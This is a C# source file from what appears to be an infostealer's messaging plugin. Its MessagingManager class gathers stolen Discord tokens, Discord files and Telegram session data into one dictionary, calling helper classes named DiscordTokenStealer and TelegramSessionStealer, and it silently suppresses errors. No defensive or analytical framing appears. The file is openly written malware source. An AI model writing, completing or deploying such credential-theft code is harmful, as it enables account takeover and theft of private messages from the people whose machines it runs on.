using System;
using System.Collections.Generic;

namespace Plugin.Messaging
{
    public class MessagingManager
    {
        public static Dictionary<string, object> StealAllMessagingData()
        {
            Dictionary<string, object> allData = new Dictionary<string, object>();
            
            try
            {
                // Steal Discord tokens
                List<string> discordTokens = DiscordTokenStealer.ExtractTokens();
                if (discordTokens.Count > 0)
                {
                    allData["Discord_Tokens"] = discordTokens;
                }
                
                // Steal Discord files
                Dictionary<string, byte[]> discordFiles = DiscordTokenStealer.StealDiscordFiles();
                if (discordFiles.Count > 0)
                {
                    allData["Discord_Files"] = discordFiles;
                }
            }
            catch { }
            
            try
            {
                // Steal Telegram session
                Dictionary<string, byte[]> telegramSession = TelegramSessionStealer.StealTelegramSession();
                if (telegramSession.Count > 0)
                {
                    allData["Telegram_Session"] = telegramSession;
                }
            }
            catch { }
            
            return allData;
        }
    }
}
